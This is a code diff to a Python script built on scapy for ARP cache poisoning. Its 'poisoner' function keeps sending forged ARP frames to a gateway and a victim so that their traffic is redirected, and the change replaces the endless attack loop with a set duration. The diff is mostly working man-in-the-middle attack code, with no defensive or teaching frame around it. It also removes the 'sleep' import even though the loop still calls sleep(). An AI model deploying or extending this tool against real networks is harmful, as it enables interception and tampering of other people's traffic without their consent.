@@ -1,8 +1,10 @@
 from re import match
-from time import sleep
 from scapy.all import *
 
+import time
+
 BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
+
 
 def MAC_for_IP(given_IP, timeout=2, retry=2, verbose=0):
     """
@@ -24,7 +26,7 @@ def MAC_for_IP(given_IP, timeout=2, retry=2, verbose=0):
     return None
 
 
-def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1):
+def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1, duration=100):
     """
     Main poisoner function.
 
@@ -34,7 +36,8 @@ def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1):
     Optional Args:
         new_MAC     : MAC address to replace with (default=None, meaning the current system)
         verbose     : Verbosity level (default=0)
-        interval    : Interval between attacks (default=1)
+        interval    : Interval between attacks in seconds (default=1)
+        duration    : Duration of the attack in seconds (default=100)
     """
     if verbose > 0:
         print("Finding MAC addresses for gateway and victim...", end="")
@@ -62,20 +65,18 @@ def poisoner(gateway_IP, victim_IP, new_MAC=None, verbose=0, interval=1):
     if verbose > 0:
         print("done")
 
-    # Keep doing this for a long time i.e., until the poisoner stops it.
+    # Do this for duration amount of time
+    end_time = time.time() + duration
     n_times = 0
-    while 1:
-        try:
-            send(frame_to_gateway)
-            send(frame_to_victim)
-            sleep(interval)
-            n_times += 1
-        except KeyboardInterrupt:
-            break
-
+    while time.time() < end_time:
+        send(frame_to_gateway)
+        send(frame_to_victim)
+        sleep(interval)
+        n_times += 1
     return n_times
 
-def ARP_restore(gateway_IP, victim_IP, verbose):
+
+def doctor(gateway_IP, victim_IP, verbose):
     """
     Generally used to revert the changes made by the poisoning attack.
 
